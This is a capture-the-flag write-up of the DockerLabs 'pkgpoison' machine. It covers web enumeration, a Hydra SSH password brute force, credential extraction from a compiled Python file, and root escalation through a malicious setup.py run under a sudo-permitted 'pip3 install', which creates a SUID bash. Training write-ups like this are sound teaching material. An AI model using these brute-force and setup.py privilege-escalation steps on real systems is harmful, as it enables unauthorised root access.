# pkgpoison

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| pkgpoison | RSA | easy/facil | dockerlabs |

**Summary:** The pkgpoison machine presented an exploitation path that began with web content discovery, where a publicly accessible note file at `/notes/note.txt` carelessly disclosed the developer credential pair `dev:developer123`. Although the note itself warned about credential weakness, the actual SSH password turned out to be a different rockyou entry recovered via Hydra bruteforce: `computer`. Once inside as `dev`, enumeration of `/opt/scripts/__pycache__/` revealed a compiled Python bytecode file `secret.cpython-38.pyc`, whose plaintext strings exposed the credentials for a second account: `admin:p@$$w0r8321`. Lateral movement to `admin` was achieved via `su`, and a `sudo -l` check revealed that `admin` was permitted to run `/usr/bin/pip3 install *` as root without a password. This sudo misconfiguration was abused by crafting a malicious `setup.py` script in `/tmp` that copied `/bin/bash` to `/tmp/rootbash` with the SUID bit set. Executing `sudo pip3 install .` triggered the payload, after which `rootbash -p` granted an effective root shell. A final `python3` one-liner fully dropped privileges to `uid=0(root)` and a clean `su -` completed the escalation to a fully interactive root session.

---

## Reconnaissance

The engagement began with machine deployment followed by a full-port Nmap scan to identify the attack surface.

**1. Machine Deployment**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pkgpoison]
└─$ sudo bash auto_deploy.sh pkgpoison.tar 
[sudo] password for ouba: 

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /"""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

**2. Port Scan**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pkgpoison]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-27 17:32 +0700
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2f:87:50:66:15:23:d6:c3:90:3f:ea:8c:a4:4b:b3:ff (RSA)
|   256 d1:35:c1:82:09:e8:c2:c7:cd:98:89:61:c2:6b:14:64 (ECDSA)
|_  256 dd:01:45:ce:bd:a3:05:21:5b:31:4c:2f:df:38:c4:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: 404 Not Found
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 86:4D:61:E1:08:B7 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.39 seconds
```

The scan exposed two open ports: SSH on 22 and an Apache HTTP server on 80. The web server returned a `404 Not Found` on the root path, signalling that content was buried elsewhere and warranted enumeration.

---

## Initial Access

### Web Content Discovery

**3. Feroxbuster Directory and File Enumeration**

A recursive content discovery scan was launched with feroxbuster, targeting a broad set of extensions including PHP, text files, archives, and images.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pkgpoison]
└─$ feroxbuster -u http://$ip/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html,tar,env,pkg,zip,jpg,jpeg -t 50
                                                                                         
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.17.0.2/
 🚩  In-Scope Url          │ 172.17.0.2
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html, tar, env, pkg, zip, jpg, jpeg]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       26l       51w      589c http://172.17.0.2/index.html
301      GET        9l       28w      308c http://172.17.0.2/notes => http://172.17.0.2/notes/
200      GET        5l       24w      177c http://172.17.0.2/notes/note.txt
200      GET     5094l    30782w  2832734c http://172.17.0.2/index.png
200      GET       26l       51w      589c http://172.17.0.2/
```

Feroxbuster revealed a `notes/` directory and a plaintext file at `/notes/note.txt`.

**4. Reading the Note File**

The note file was retrieved with curl to inspect its contents.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pkgpoison]
└─$ curl -v http://$ip/notes/note.txt
*   Trying 172.17.0.2:80...
* Established connection to 172.17.0.2 (172.17.0.2 port 80) from 172.17.0.1 port 38396 
* using HTTP/1.x
> GET /notes/note.txt HTTP/1.1
> Host: 172.17.0.2
> User-Agent: curl/8.20.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Mon, 27 Jul 2026 10:39:37 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Last-Modified: Tue, 20 May 2025 21:20:25 GMT
< ETag: "b1-63597d11df840"
< Accept-Ranges: bytes
< Content-Length: 177
< Vary: Accept-Encoding
< Content-Type: text/plain
< 
Dear developer,
Please remember to change your credentials "dev:developer123" to something stronger.
I've already warned you that weak passwords can get us compromised.

-Admin
* Connection #0 to host 172.17.0.2 left intact
```

The note disclosed the username `dev` along with a credential hint. Although the note itself contained the string `developer123`, a bruteforce was conducted to confirm or recover the actual password in use.

### SSH Access as dev

**5. Hydra SSH Bruteforce**

Hydra was used to bruteforce the SSH service for the `dev` account against the rockyou wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pkgpoison]
└─$ hydra -l dev -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 4 -I
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-27 17:45:58
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: dev   password: computer
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 3 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-27 17:47:09
```

The actual SSH password for `dev` was `computer`. An SSH session was then established.

**6. SSH Login and Initial Enumeration**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/dl/pkgpoison]
└─$ ssh dev@$ip   
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dev@172.17.0.2's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.18.33.2-microsoft-standard-WSL2 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
dev@cd7f608bb176:~$ id;whoami;hostname
uid=1000(dev) gid=1000(dev) groups=1000(dev)
dev
cd7f608bb176
dev@cd7f608bb176:~$ which sudo
/usr/bin/sudo
```

A foothold as `dev` was established. The `sudo` binary was present, and enumeration of the filesystem began.

---

## Lateral Movement

### Extracting Credentials from a Python Bytecode Cache

**7. Enumerating /opt and Discovering the Bytecode File**

Inspection of `/opt` revealed a `scripts` directory containing a `__pycache__` folder with a compiled Python bytecode file owned by `admin`.

```bash
dev@cd7f608bb176:~$ ls -la /opt
total 12
drwxr-xr-x 3 root root 4096 May 18  2025 .
drwxr-xr-x 1 root root 4096 Jul 27 04:27 ..
drwxr-xr-x 3 root root 4096 May 24  2025 scripts
dev@cd7f608bb176:~$ ls -la /opt/scripts/
total 12
drwxr-xr-x 3 root root 4096 May 24  2025 .
drwxr-xr-x 3 root root 4096 May 18  2025 ..
drwxr-xr-x 2 root root 4096 May 24  2025 __pycache__
dev@cd7f608bb176:~$ ls -la /opt/scripts/__pycache__/
total 12
drwxr-xr-x 2 root  root  4096 May 24  2025 .
drwxr-xr-x 3 root  root  4096 May 24  2025 ..
-rw-r--r-- 1 admin admin  274 May 24  2025 secret.cpython-38.pyc
dev@cd7f608bb176:~$ which file
/usr/bin/file
dev@cd7f608bb176:~$ file /opt/scripts/__pycache__/secret.cpython-38.pyc 
/opt/scripts/__pycache__/secret.cpython-38.pyc: data
dev@cd7f608bb176:~$ which strings
/usr/bin/strings
dev@cd7f608bb176:~$ strings /opt/scripts/__pycache__/secret.cpython-38.pyc 
adminz
p@$$w0r8321z
Authenticating...)
print)
usernameZ
password
        secret.py
auth
<module>
```

The `strings` utility extracted readable content from the `.pyc` file, revealing the credentials `admin:p@$$w0r8321` embedded in the compiled bytecode.

**8. Lateral Movement to admin via su**

```bash
dev@cd7f608bb176:~$ su - admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@cd7f608bb176:~$ sudo -l
Matching Defaults entries for admin on cd7f608bb176:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on cd7f608bb176:
    (ALL) NOPASSWD: /usr/bin/pip3 install *
```

The switch to `admin` succeeded. A `sudo -l` check revealed a critical misconfiguration: `admin` was permitted to execute `sudo /usr/bin/pip3 install *` without a password. This is a well-known privilege escalation vector, as pip executes `setup.py` as root during the install process.

---

## Privilege Escalation

### Abusing sudo pip3 install via a Malicious setup.py

**9. Crafting the Malicious Package and Triggering the Payload**

A minimal `setup.py` was written in `/tmp` containing a shell command that copies `/bin/bash` to `/tmp/rootbash` and sets the SUID bit on it. Running `sudo pip3 install .` causes pip to execute this script as root.

```bash
admin@cd7f608bb176:~$ cd /tmp
admin@cd7f608bb176:/tmp$ nano setup.py
admin@cd7f608bb176:/tmp$ cat setup.py 
import os
os.system("cp /bin/bash /tmp/rootbash && chmod +sx /tmp/rootbash")
admin@cd7f608bb176:/tmp$ sudo /usr/bin/pip3 install .
Processing /tmp
ERROR: Files/directories not found in /tmp/pip-req-build-bl6tvvkk/pip-egg-info
admin@cd7f608bb176:/tmp$ ls -la /tmp/rootbash 
-rwsr-sr-x 1 root root 1183448 Jul 27 05:01 /tmp/rootbash
admin@cd7f608bb176:/tmp$ /tmp/rootbash -p
rootbash-5.0# id
uid=1001(admin) gid=1001(admin) euid=0(root) egid=0(root) groups=0(root),1001(admin)
```

Despite pip returning an error about missing egg-info metadata, the `setup.py` payload was already executed. The resulting `/tmp/rootbash` binary had the SUID bit set and an effective UID of root, confirmed by `id`.

**10. Dropping to a Full Root Shell**

```bash
rootbash-5.0# python3 -c 'import os;os.setuid(0);os.setgid(0);os.system("/bin/bash")'
root@cd7f608bb176:/tmp# id
uid=0(root) gid=0(root) groups=0(root),1001(admin)
root@cd7f608bb176:/tmp# su - 
root@cd7f608bb176:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
cd7f608bb176
```

A `python3` one-liner was used to call `setuid(0)` and `setgid(0)`, fully dropping to real root and spawning `/bin/bash`. A subsequent `su -` confirmed a clean root session with all groups resolved correctly.

---

## Attack Chain Summary
1. **Reconnaissance**: Nmap identified ports 22 (SSH) and 80 (HTTP Apache). The web root returned a 404, indicating hidden content.
2. **Vulnerability Discovery**: Feroxbuster enumerated a `notes/` directory containing `note.txt`, which leaked the username `dev` and suggested a weak password. Hydra bruteforced the actual SSH password: `computer`.
3. **Exploitation**: SSH access was gained as `dev`. Enumeration of `/opt/scripts/__pycache__/` uncovered `secret.cpython-38.pyc`. The `strings` command extracted hardcoded credentials `admin:p@$$w0r8321` from the bytecode.
4. **Internal Enumeration**: Lateral movement was achieved via `su - admin`. A `sudo -l` check revealed that `admin` could run `sudo /usr/bin/pip3 install *` without a password.
5. **Privilege Escalation**: A malicious `setup.py` was planted in `/tmp` with a SUID bash payload. Executing `sudo pip3 install .` triggered the payload as root, producing a SUID `/tmp/rootbash`. A `python3` setuid call then spawned a fully privileged root shell.
